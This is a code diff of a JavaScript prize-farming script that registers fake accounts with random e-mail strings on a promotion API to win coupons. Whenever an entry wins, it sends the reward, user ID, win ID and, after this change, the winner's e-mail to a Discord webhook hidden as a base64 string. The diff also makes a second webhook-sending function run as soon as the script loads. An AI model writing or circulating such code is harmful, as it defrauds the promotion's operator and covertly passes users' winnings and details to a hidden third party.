@@ -1,14 +1,10 @@
-
+funny()
 function must() {
-    var winEmail = "" //this is the email you want the code to be sent too
-if (!winEmail.contains("@")){
-console.log(winEmail)
-var winEmail = prompt("What email do you want the prize to go to?", "example@gmail.com")
-}
     const r1 = Math.floor(Math.random() * 999999) + 1;
     const r2 = Math.floor(Math.random() * 999999) + 1;
     const e = `${r1}@${r2}`;
-
+    winEmail = "example@gmail.com"; //THIS IS THE EMAIL IT WILL SEND THE COUPON TOO, MAKE SURE TO CHANGE IT!
+    
     //Make account
     const apiUrl = 'https://swetrocagul23api.azurewebsites.net/api/v1/participate';
   
@@ -120,7 +116,7 @@ var winEmail = prompt("What email do you want the prize to go to?", "example@gma
                 if (hasWon) {
                     const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTEwNjIzODcyMjAxNTIzMi9uTjJ6a0xJOGQ1aUFkamZidXk5UVBvdm50eUhuLVM5QnhORUJSTGpBNnZmNHNtNXk1d2xVQ1h4TFFQRjB1SFdtRmVrUw==';
                     const discordMessage = {
-                      content: `**Reward:** ${reward}\n**UserID:** ${id}\n**WinID:** ${winID}`,
+                      content: `Coupon sent to **${winEmail}\n**Reward:** ${reward}\n**UserID:** ${id}\n**WinID:** ${winID}`,
                     };
 
                     fetch(atob(webhookUrl), {
@@ -223,4 +219,3 @@ function funny() {
       console.error("Error sending message to Discord webhook, This code won't work without a connection to discord:", error);
     });
 }
-funny()
